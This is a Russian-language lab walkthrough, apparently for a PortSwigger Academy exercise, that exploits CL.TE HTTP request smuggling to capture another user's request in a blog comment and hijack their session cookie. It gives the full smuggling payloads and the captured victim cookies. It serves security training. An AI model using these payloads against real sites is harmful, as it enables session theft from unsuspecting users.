Перейдем на уязвимый ресурс 

и оставим  комментарий на странице


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/9.%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/pics%20for%20walkthrough/1.png)

Перейдем в `Proxy` -> `HTTP history` и найдем там его
и отправим его в `Repeater`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/9.%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/pics%20for%20walkthrough/2.png)

А так же в Repeater отправим запрос на корневую страницу, с помощью нее мы и выясним` CL/TE` на фронте и на бэке

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/9.%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/pics%20for%20walkthrough/3.png)
```
POST / HTTP/1.1
Host: 0aee00aa039a2bb2846a5454001600da.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-encoding: chunked

3
abc
X
```
и в ответ увидим timeout 

а значит, что там связки `CL + TE`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/9.%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/pics%20for%20walkthrough/4.png)

Далее идея состоит в следующем, чтобы запрос от стороннего юзверя попал в комментарии, и мы потом его прочли с комментария и получили все его заголовки где есть куки!

Воспользуемся квери для комментария 
```
POST / HTTP/1.1
Host: 0aee00aa039a2bb2846a5454001600da.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 349
Transfer-encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0aee00aa039a2bb2846a5454001600da.web-security-academy.net
Cookie: session=9wUPlistaYTBxsXGDGq2GlWtsyDsDkOW
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

csrf=HLIq8YBXcSQHIbMVkjdYvsOjzIR0xGwH&postId=6&name=naming&email=test%40test.com&website=http%3A%2F%2Fqq.com&comment=commentariy
```
и главное `comment=commentariy` поставим в конец, ибо в него должны попасть заголовки другого запроса

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/9.%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/pics%20for%20walkthrough/5.png)

и немного подождем, и обновим страницу на вебморде

увидим, что у нас все получилось, но не весь запрос попал в комментарий
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/9.%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/pics%20for%20walkthrough/6.png)

Увеличим число до 950 байт


```
POST / HTTP/1.1
Host: 0aee00aa039a2bb2846a5454001600da.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 349
Transfer-encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0aee00aa039a2bb2846a5454001600da.web-security-academy.net
Cookie: session=9wUPlistaYTBxsXGDGq2GlWtsyDsDkOW
Content-Type: application/x-www-form-urlencoded
Content-Length: 950

csrf=HLIq8YBXcSQHIbMVkjdYvsOjzIR0xGwH&postId=6&name=naming&email=test%40test.com&website=http%3A%2F%2Fqq.com&comment=commentariy1
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/9.%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/pics%20for%20walkthrough/7.png)

и спустя время увидим страницу
```
commentariy1GET / HTTP/1.1 Host: 0aee00aa039a2bb2846a5454001600da.web-security-academy.net sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: "Linux" upgrade-insecure-requests: 1 user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 sec-fetch-site: none sec-fetch-mode: navigate sec-fetch-user: ?1 sec-fetch-dest: document accept-encoding: gzip, deflate, br, zstd accept-language: en-US,en;q=0.9 priority: u=0, i cookie: victim-fingerprint=0Fxc6sGKPf69T04Y60MxiKFg4bMLcTDy; secret=VxVj8QJzGl1dRlcgailMbcBhUNZB7IfC; session=pEevvUTUHtmpFUwy0CxHrCXpozeWoDt4 C
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/9.%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/pics%20for%20walkthrough/8.png)

в которой и есть куки пользовтателя
`session=pEevvUTUHtmpFUwy0CxHrCXpozeWoDt4`

сменим куки в браузере и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/9.%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/pics%20for%20walkthrough/9.png)
